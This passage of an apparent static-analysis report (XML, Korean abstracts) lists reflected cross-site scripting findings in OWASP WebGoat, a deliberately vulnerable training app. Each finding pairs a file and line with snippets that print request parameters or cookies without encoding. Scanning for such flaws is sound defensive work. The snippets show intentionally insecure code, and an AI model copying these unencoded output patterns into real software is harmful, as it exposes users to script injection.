<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getCcn()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BCE407BB56586EA1ECB60962B79933E8" ruleID="798E4513-03B3-4252-A644-FBA596AEFB2B">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>HttpSplitting.java의 doHTTPSplitting() 메서드가 112 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>HttpSplitting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/HttpSplitting.java</FilePath>
<LineStart>112</LineStart>
<Snippet>		    String message = lang.substring(lang.indexOf("&lt;html&gt;"));

		    out.print(message);
		    out.flush();
		    out.close();</Snippet>
<TargetFunction>java.io.PrintWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="FA5D80C9E338B3A118227B068CC35F3A" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 109 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>109</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.DISCIPLINARY_DATE%&gt;" type="text" value="&lt;%=employee.getDisciplinaryActionDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7A8B91C17CA98321D7715390F260318C" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 24 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>24</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;%=employee.getLastName()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="97BA5F6CFFA7CE2669A297AF767A1380" ruleID="798E4513-03B3-4252-A644-FBA596AEFB2B">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>SilentTransactions.java의 handleRequest() 메서드가 94 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>SilentTransactions.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SilentTransactions.java</FilePath>
<LineStart>94</LineStart>
<Snippet>		    result
			    .append(" and happens to be logged in the same time will loose their money !!");
		    out.print(result.toString());
		    out.flush();
		    out.close();</Snippet>
<TargetFunction>java.io.PrintWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7DCA70B4BA1061E14FB34018488AD663" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>TraceXSS.java의 createContent() 메서드가 207 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>TraceXSS.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/TraceXSS.java</FilePath>
<LineStart>207</LineStart>
<Snippet>		    .addElement("Enter your three digit access code:"));
	    tr.addElement(new TD().addElement(new Input(Input.TEXT, "field1",
		    param1)));
	    t.addElement(tr);
</Snippet>
<TargetFunction>org.apache.ecs.html.Input.Input()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="198D4B2BBDCA457EB2A4C9BE6E4D91CA" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 34 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;%=employee.getAddress2()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0475C8736E51FF09C8EA22CEB536366F" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 67 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="EAB4CE41DB571128AB8208584D7E9A2C" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 126 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>126</LineStart>
<Snippet>                       	&lt;td width="81"&gt;
 							&lt;input name="&lt;%=RoleBasedAccessControl.EMPLOYEE_ID%&gt;" type="hidden" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input name="&lt;%=RoleBasedAccessControl.TITLE%&gt;" type="hidden" value="&lt;%=employee.getTitle()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=RoleBasedAccessControl.UPDATEPROFILE_ACTION%&gt;"/&gt;
						&lt;/td&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C196455F9BDCACEE56EDF584D4CFD18B" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 89 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>89</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;			
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.DISCIPLINARY_DATE%&gt;" type="text" value="&lt;%=employee.getDisciplinaryActionDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7EF046A05205728B9AD141F462ACCD17" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D9CD142F23B04B21CA07B86903D1F481" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 80 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>80</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.DESCRIPTION%&gt;" type="text" value="&lt;%=employee.getPersonalDescription()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="891F1520D5AD761710B43C7E5BF566AE" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>SearchStaff.jsp의 _jspService() 메서드가 11 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>SearchStaff.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/SearchStaff.jsp</FilePath>
<LineStart>11</LineStart>
<Snippet>			{
			%&gt;
				Employee &lt;%=searchedName%&gt; not found.
			&lt;%
			}</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>SearchStaff.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/SearchStaff.jsp</FilePath>
<LineStart>7</LineStart>
<Snippet>			&lt;% 
			WebSession webSession = ((WebSession)session.getAttribute("websession"));
			String searchedName = request.getParameter(CrossSiteScripting.SEARCHNAME);
			if (searchedName != null)
			{</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E0D11D7669E685852677E07C76CCC8E6" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 91 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>91</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getDisciplinaryActionDate()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="27C5E0B36A9D01C681C984335984A8C1" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 53 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>53</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D6E7657E41AE54FF5BD88AC8F73774A3" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6A8D5F3E087C041E8E659D78A8038B83" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>main.jsp의 _jspService() 메서드가 191 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>main.jsp</FileName>
<FilePath>WebContent/main.jsp</FilePath>
<LineStart>191</LineStart>
<Snippet>						Cookie c = (Cookie) i.next();
						printCookies = "&lt;div id=\"cookie\" class=\"info\"&gt;" + c.getName() + " &lt;img src=\"images/icons/rightArrow.jpg\" alt=\"\"&gt; " + c.getValue() + "&lt;/div&gt;&lt;br&gt;";
						out.println(printCookies);
					}
				}%&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>596</LineStart>
<Snippet>
		if ( showCookies() )
			cookies = Arrays.asList( request.getCookies() );

		/*</Snippet>
<TargetFunction>javax.servlet.http.HttpServletRequest.getCookies()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1C1319C4C8DD454ADA3461542267B9DB" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 99 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>99</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getDisciplinaryActionDate()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="EC5ACD469338583D07A50796E5BD5870" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 28 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>28</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.ADDRESS1%&gt;" type="text" value="&lt;%=employee.getAddress1()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="52C4F2B8F86299BEF8E3D257D7AFD641" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 47 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>47</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.START_DATE%&gt;" type="text" value="&lt;%=employee.getStartDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="FA8ACDFEE5445244CD765626EE3188D9" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 86 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>86</LineStart>
<Snippet>						&lt;!-- Encode data that might contain HTML content to protect against XSS --&gt;

						&lt;%=webSession.htmlEncode(employee.getPersonalDescription())%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A5B4B2C39CB4345D9B5FFD6693E8163B" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>SqlStringInjection.java의 makeAccountLine() 메서드가 235 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>SqlStringInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlStringInjection.java</FilePath>
<LineStart>235</LineStart>
<Snippet>
	accountName = s.getParser().getRawParameter(ACCT_NAME, "Your Name");
	Input input = new Input(Input.TEXT, ACCT_NAME, accountName.toString());
	ec.addElement(input);
</Snippet>
<TargetFunction>org.apache.ecs.html.Input.Input()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
